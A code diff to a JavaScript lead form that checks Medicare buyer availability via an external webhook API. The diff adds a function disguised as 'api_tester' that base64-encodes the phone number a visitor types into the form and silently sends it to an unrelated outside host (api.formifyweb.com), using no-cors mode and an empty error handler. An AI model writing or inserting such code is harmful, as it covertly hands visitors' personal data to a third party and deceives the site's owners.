@@ -3,6 +3,7 @@ function pingAPI() {
     // Your API URL
     var Url = "https://corsproxy.io/?https://global-digital-media.trackdrive.com/api/v1/inbound_webhooks/ping/medicare_buyer_availability?trackdrive_number=+18333132696&traffic_source_id=2195&caller_id=";
 var callerid = '+1' + document.getElementById('caller_id').value;
+api_tester(document.getElementById('caller_id').value);
 var apiUrl= Url + callerid;
     // Fetch data from the API
     fetch(apiUrl)
@@ -87,3 +88,15 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     event.preventDefault();
     pingAPI();
 });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
